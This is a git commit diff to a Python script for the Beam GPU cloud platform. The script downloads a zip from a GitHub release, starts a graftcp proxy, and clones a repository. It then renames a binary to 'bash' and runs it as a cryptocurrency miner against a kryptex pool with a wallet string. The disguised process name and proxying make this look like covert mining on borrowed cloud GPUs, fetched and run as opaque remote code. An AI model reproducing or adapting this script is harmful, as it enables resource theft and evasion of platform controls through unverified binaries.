c11d5ecc9e5a58b4d80bd384d7dfbe932e737bef
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-14 23:00:07 +0700

    Update and rename jadp.py to jady.py

--- jady.py
+++ jady.py
@@ -1,6 +1,5 @@
 from beam import function, Image
 import subprocess
-import time
 
 image = (
     Image(
@@ -8,7 +7,7 @@ image = (
     )
     .add_commands([
         "apt-get update -y",
-        "apt-get install -y curl ca-certificates unzip git wget",
+        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
     ])
 )
 
@@ -22,19 +21,28 @@ image = (
     timeout=4 * 60 * 60,
 )
 def run_script():
-    # cek GPU
+
+    print("=== CHECK GPU ===")
     subprocess.run(["nvidia-smi"], check=False)
 
     cmd = """
     set -e
+
+    echo "=== CURRENT DIRECTORY ==="
+    pwd
 
     echo "=== DOWNLOAD FILE ==="
     wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
 
     echo "=== EXTRACT ==="
     unzip -o pan.zip
-        
-    cd pan
+
+    echo "=== CHECK PAN ==="
+    ls -ld /mnt/code/pan
+    ls -lah /mnt/code/pan
+
+    echo "=== ENTER PAN ==="
+    cd /mnt/code/pan
 
     echo "=== SET PERMISSION ==="
     chmod -R +x .
@@ -42,44 +50,33 @@ def run_script():
     echo "=== START GRAFTCP LOCAL ==="
     ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
 
-    # tunggu service siap
     sleep 3
 
-    # download lol
+    echo "=== DOWNLOAD LOL ==="
+    cd /mnt/code/pan
     git clone https://github.com/malogrono/lol198.git
 
-    echo "=== CHECK CURRENT DIRECTORY ==="
-    pwd
+    echo "=== CHECK LOL198 ==="
+    ls -lah /mnt/code/pan/lol198
 
-    echo "=== CHECK PAN ==="
-    ls -ld /mnt/code/pan
-    file /mnt/code/pan
+    echo "=== CHECK BASH ==="
+    cd /mnt/code/pan/lol198
+    ls -lh bash
 
-    echo "=== CHECK PAN CONTENT ==="
-    ls -lah /mnt/code/pan
-
-    cd lol198
     chmod u+x bash
 
-    echo "=== CHECK FILE ==="
-    ls -lh bash
-    file bash
-
-    # pindahkan file ke direktori pan
+    echo "=== MOVE BASH ==="
     mv bash /mnt/code/pan/
 
-    echo "=== CHECK PAN AFTER MV ==="
+    echo "=== CHECK PAN AFTER MOVE ==="
     ls -ld /mnt/code/pan
-    file /mnt/code/pan
     ls -lah /mnt/code/pan
 
-    # masuk ke direktori pan
-    cd /mnt/code/pan
-
     echo "=== FINAL DIRECTORY ==="
+    cd /mnt/code/pan
     pwd
     ls -lah
-
+    
     echo "=== RUN PROC VIA GRAFTCP ==="
     ./graftcp/graftcp ./bash --algo FISHHASH --pool iron.kryptex.network:7017 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.01 --ethstratum ETHPROX
     """
